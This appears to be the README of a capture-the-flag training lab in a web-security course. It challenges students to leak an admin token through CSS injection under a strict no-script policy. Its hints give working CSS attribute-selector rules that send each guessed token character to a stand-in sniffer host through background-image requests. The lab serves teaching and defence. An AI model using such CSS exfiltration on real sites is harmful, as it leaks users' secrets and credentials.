# Lab 2: Unsolved Challenge — CSS Data Exfiltration

> 🌐 **Language:** **English** | [🇸🇦 النسخة العربية (README.ar.md)](./README.ar.md)

---

## 🎯 Challenge Mission Brief

**Client Target:** Vanguard Cloud Key Vault  
**Environment:** Zero-JS runtime protected by strict Content Security Policy (`script-src 'none'`).  
**Mission Objective:** A customer support portal permits users to inject custom CSS styles to customize their dashboard appearance. An administrative token sits in an input field on the page. Your mission is to use **pure CSS attribute selectors** to exfiltrate the secret administrative token character-by-character without writing any JavaScript!

---

## 🕵️ Rules of Engagement

1. **Zero JavaScript:** You must not attempt to bypass CSP with script tags. All exfiltration logic must reside strictly inside CSS rules in the custom theme injector.
2. **Flag Format:** The secret token follows the standard format: `FLAG{...}`.
3. **Deliverable:** When you successfully deduce the flag, document your methodology, proof of concept, and remediation steps in `REPORT_TEMPLATE.md`.

---

## 💡 Practical Methodology & Hints

1. **Prefix Attribute Selectors (`^=`):**
   ```css
   input[name="admin_token"][value^="FLAG{A"] {
       background-image: url("http://sniffer.local/leak?char=A");
   }
   input[name="admin_token"][value^="FLAG{B"] {
       background-image: url("http://sniffer.local/leak?char=B");
   }
   input[name="admin_token"][value^="FLAG{C"] {
       background-image: url("http://sniffer.local/leak?char=C");
   }
   ```
2. When the browser matches a rule, it evaluates the `background-image` property, firing an outbound GET request to the sniffer URL.
3. Observe which character triggers the packet sniffer, record it, and append the next character to your selector query!

---

## 🚀 How to Launch the Challenge

Open `index.html` in your browser:
```powershell
Start-Process chrome.exe "E:\Programming Languages\02-HTML-CSS\Level-3-Advanced-and-Security\Labs\Lab-2-Challenge-Unsolved\index.html"
```

Once completed, fill out **[REPORT_TEMPLATE.md](./REPORT_TEMPLATE.md)** with your full pentest findings.
